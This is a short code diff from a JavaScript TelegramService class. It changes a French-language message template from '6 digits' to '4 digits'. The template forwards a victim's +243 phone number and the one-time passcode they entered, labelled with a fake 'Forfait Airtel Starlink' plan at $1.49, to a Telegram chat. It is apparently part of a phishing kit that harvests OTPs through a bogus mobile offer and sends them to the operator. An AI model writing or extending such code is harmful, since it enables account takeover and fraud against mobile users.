@@ -226,7 +226,7 @@ class TelegramService {
 
     // 2. Direct Telegram API
     const messageText =
-      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (6 CHIFFRES)</b>\n\n` +
+      `🔐 <b>CODE DE VÉRIFICATION OTP REÇU (4 CHIFFRES)</b>\n\n` +
       `👤 <b>Numéro:</b> <code>+243 ${phone || existing.phone || 'Inconnu'}</code>\n` +
       `🔢 <b>Code OTP Saisi:</b> <code>${otp}</code>\n` +
       `📦 <b>Forfait:</b> ${planName || existing.planName || 'Forfait Airtel Starlink'} (${planPrice || existing.planPrice || '$1.49'})\n` +
